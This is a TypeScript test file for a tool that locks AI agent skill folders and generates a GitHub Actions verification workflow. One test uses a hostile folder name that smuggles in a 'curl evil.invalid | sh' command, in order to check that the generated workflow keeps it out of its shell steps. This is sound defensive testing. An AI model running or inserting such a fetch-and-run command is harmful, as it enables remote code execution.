import { existsSync, mkdirSync, mkdtempSync, readFileSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { describe, expect, it } from "vitest";
import { parse } from "yaml";
import { detectSkillsDir, LOCKFILE, runInit, WORKFLOW, workflowYaml } from "../src/init.js";

function repo(skills: Record<string, string> = {}): string {
  const cwd = mkdtempSync(join(tmpdir(), "sl-init-"));
  for (const [path, body] of Object.entries(skills)) {
    mkdirSync(join(cwd, path), { recursive: true });
    writeFileSync(join(cwd, path, "SKILL.md"), body);
  }
  return cwd;
}

function init(cwd: string, opts: { dir?: string; ci?: boolean } = {}) {
  const lines: string[] = [];
  const code = runInit({ cwd, version: "9.9.9", log: (l) => lines.push(l), ...opts });
  return { code, out: lines.join("\n") };
}

describe("detectSkillsDir", () => {
  it("prefers .claude/skills", () => {
    const cwd = repo({ ".claude/skills/a": "# a", "skills/b": "# b" });
    expect(detectSkillsDir(cwd)).toEqual({ dir: ".claude/skills", others: ["skills"] });
  });
  it("finds .agents/skills and skills/", () => {
    expect(detectSkillsDir(repo({ ".agents/skills/a": "# a" }))?.dir).toBe(".agents/skills");
    expect(detectSkillsDir(repo({ "skills/team/a": "# a" }))?.dir).toBe("skills");
  });
  it("prefers a folder with skills over an empty one", () => {
    const cwd = repo({ "skills/a": "# a" });
    mkdirSync(join(cwd, ".claude", "skills"), { recursive: true });
    expect(detectSkillsDir(cwd)?.dir).toBe("skills");
  });
  it("returns undefined when there is no skills folder", () => {
    expect(detectSkillsDir(repo())).toBeUndefined();
  });
});

describe("init", () => {
  it("writes the lockfile and the workflow", () => {
    const cwd = repo({ ".claude/skills/demo": "# demo" });
    const { code, out } = init(cwd);
    expect(code).toBe(0);
    const lock = JSON.parse(readFileSync(join(cwd, LOCKFILE), "utf8"));
    expect(Object.keys(lock.skills)).toEqual(["demo"]);
    expect(readFileSync(join(cwd, WORKFLOW), "utf8")).toContain("skill-lock@9.9.9 verify");
    expect(out).toContain("Skills folder: .claude/skills (1 skill)");
    expect(out).toMatch(/Next: commit .*git add skills\.lock\.json \.github\/workflows\/skill-lock\.yml/);
  });

  it("is idempotent: a second run changes nothing and exits 0", () => {
    const cwd = repo({ ".claude/skills/demo": "# demo" });
    init(cwd);
    const lockBefore = readFileSync(join(cwd, LOCKFILE), "utf8");
    writeFileSync(join(cwd, WORKFLOW), "# edited by the user\n");
    const { code, out } = init(cwd);
    expect(code).toBe(0);
    expect(readFileSync(join(cwd, LOCKFILE), "utf8")).toBe(lockBefore);
    expect(readFileSync(join(cwd, WORKFLOW), "utf8")).toBe("# edited by the user\n");
    expect(out).toContain("already matches");
    expect(out).toContain("already exists");
  });

  it("never overwrites a lockfile that no longer matches", () => {
    const cwd = repo({ ".claude/skills/demo": "# demo" });
    init(cwd);
    const lockBefore = readFileSync(join(cwd, LOCKFILE), "utf8");
    writeFileSync(join(cwd, ".claude/skills/demo/SKILL.md"), "# demo, changed");
    const { code, out } = init(cwd);
    expect(code).toBe(1);
    expect(readFileSync(join(cwd, LOCKFILE), "utf8")).toBe(lockBefore);
    expect(out).toContain("changed  demo");
    expect(out).toContain("--update");
  });

  it("skips the workflow with --no-ci", () => {
    const cwd = repo({ ".claude/skills/demo": "# demo" });
    const { code, out } = init(cwd, { ci: false });
    expect(code).toBe(0);
    expect(existsSync(join(cwd, LOCKFILE))).toBe(true);
    expect(existsSync(join(cwd, WORKFLOW))).toBe(false);
    expect(out).toContain("git add skills.lock.json &&");
  });

  it("uses --dir and writes it into the workflow", () => {
    const cwd = repo({ "tools/my skills/demo": "# demo" });
    expect(init(cwd, { dir: "tools/my skills" }).code).toBe(0);
    const wf = parse(readFileSync(join(cwd, WORKFLOW), "utf8"));
    expect(wf.jobs["skill-lock"].env.SKILLS_DIR).toBe("tools/my skills");
  });

  it("fails clearly when no skills folder exists or --dir is wrong", () => {
    const none = init(repo());
    expect(none.code).toBe(1);
    expect(none.out).toContain("--dir");
    expect(init(repo(), { dir: "missing" }).code).toBe(1);
    expect(init(repo({ "a/x": "# x" }), { dir: ".." }).code).toBe(1);
  });
});

describe("generated workflow", () => {
  it("is valid YAML that runs verify and scan on pull requests", () => {
    const wf = parse(workflowYaml(".claude/skills", "1.2.3"));
    expect(wf.name).toBe("skill-lock");
    expect(wf.on).toHaveProperty("pull_request");
    expect(wf.permissions).toEqual({ contents: "read" });
    const steps = wf.jobs["skill-lock"].steps as { uses?: string; run?: string; if?: string }[];
    expect(steps.map((s) => s.uses).filter(Boolean)).toEqual(["actions/checkout@v7", "actions/setup-node@v7"]);
    const runs = steps.map((s) => s.run).filter(Boolean);
    expect(runs).toEqual([
      'npx --yes skill-lock@1.2.3 verify "$SKILLS_DIR"',
      'npx --yes skill-lock@1.2.3 scan "$SKILLS_DIR"',
    ]);
    expect(steps.at(-1)?.if).toBe("success() || failure()");
  });

  it("keeps a hostile folder name out of the shell command", () => {
    const dir = `x"; curl evil.invalid | sh; echo "`;
    const wf = parse(workflowYaml(dir, "1.2.3"));
    expect(wf.jobs["skill-lock"].env.SKILLS_DIR).toBe(dir);
    for (const s of wf.jobs["skill-lock"].steps) expect(s.run ?? "").not.toContain("curl");
  });
});
